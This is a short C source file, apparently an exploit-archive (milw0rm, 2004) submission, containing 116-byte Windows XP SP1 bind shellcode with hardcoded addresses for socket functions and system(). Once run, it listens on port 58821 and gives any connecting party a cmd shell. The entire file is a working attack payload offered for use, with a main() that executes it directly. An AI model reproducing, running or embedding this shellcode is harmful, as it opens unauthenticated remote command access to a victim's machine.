/* 116 bytes bindcode hardcoded for Windows XP SP1 */
/* but you can change the address if you want */
/* i made it pretty clear where they are  */
/* the bindcode will bind to port 58821 */
/* by silicon / silicon@chello.no */
/* greetz to dtors.net :)

#include <stdio.h>
#include <winsock2.h>

unsigned char bindcode[] = // 116 bytes bindcode for windows, port=58821, by silicon :)
"\x83\xC4\xEC\x33\xC0\x50\x50\x50\x6A\x06"
"\x6A\x01\x6A\x02\xB8"
"\x01\x5A\xAB\x71" // address of WSASocketA()
"\xFF\xD0\x8B\xD8\x33\xC0\x89\x45\xF4\xB0"
"\x02\x66\x89\x45\xF0\x66\xC7\x45\xF2\xE5"
"\xC5\x6A\x10\x8D\x55\xF0\x52\x53\xB8"
"\xCE\x3E\xAB\x71" // address of bind()
"\xFF\xD0\x6A\x01\x53\xB8"
"\xE2\x5D\xAB\x71" // address of listen()
"\xFF\xD0\x33\xC0\x50\x50\x53\xB8"
"\x8D\x86\xAB\x71" // address of accept()
"\xFF\xD0\x8B\xD8\xBA"
"\x1D\x20\xE8\x77" // address of SetStdHandle()
"\x53\x6A\xF6\xFF\xD2\x53\x6A\xF5\xFF\xD2"
"\x53\x6A\xF4\xFF\xD2\xC7\x45\xFB\x41\x63"
"\x6D\x64\x8D\x45\xFC\x50\xB8"
"\x44\x80\xC2\x77" // address of system()
"\xFF\xD0";

int main(){
 WSADATA wsadata;
 WSAStartup(WINSOCK_VERSION,&wsadata);
 ((void (*)(void)) &bindcode)();
}

// milw0rm.com [2004-09-26]